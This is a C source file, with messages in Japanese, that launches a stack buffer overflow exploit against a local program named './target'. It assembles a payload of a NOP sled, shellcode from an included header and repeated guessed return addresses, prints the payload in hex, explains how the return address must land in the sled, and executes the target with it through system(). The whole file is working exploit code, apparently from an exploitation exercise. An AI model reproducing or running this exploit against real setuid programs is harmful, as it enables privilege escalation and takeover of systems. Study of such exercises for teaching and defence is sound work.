#include<stdio.h>
#include<stdlib.h>
#include<string.h>
#include<unistd.h>
#include"shellcode.h"

int main(int argc, char **argv){
	unsigned int i, ret_addr, offset = 0;
	unsigned char *command, *buffer;

	printf("##### 攻撃者の情報 #####\n");
	printf("uid: %u, euid: %u\n", getuid(), geteuid());
	printf("size(nop_sled) = %u, size(shellcode) = %u\n", sizeof(nop_sled) - 1, sizeof(shellcode) - 1);
	printf("スタック領域の大まかなアドレスは %p です\n", &i);

	command = malloc(200);
	bzero(command, 200);
	strcpy(command, "./target \'");
	buffer = command + strlen(command);

	if(argc == 2) offset = atoi(argv[1]);
	ret_addr = (unsigned int) &i - offset;
	printf("基準になるローカル変数のアドレスからのオフセット = %u\n", offset);
	printf("このアドレスがターゲットの脆弱性を持った文字列の先頭付近のアドレス(Nop sled)を指さなければいけません -> %p - %u = 0x%x\n", &i, offset, ret_addr);

	for(i = 0; i < 190; i += 4) *((unsigned int*) (buffer+i)) = ret_addr;
	memcpy(buffer, nop_sled, sizeof(nop_sled) - 1);
	memcpy(buffer + sizeof(nop_sled) - 1, shellcode, sizeof(shellcode) - 1);
	strcat(command, "\'");

	printf("\nNop sled + Shellcode + Return address (ターゲットに送り込むシェルコードの内容)");
	for(i = 0; i < 200; i++) {
		if(i % 32 == 0) printf("\n%03d : ", i);
		printf("%02x ", (unsigned int) buffer[i]);
	}
	printf("\n\n");

	system(command);
	free(command);
	
	return 0;
}
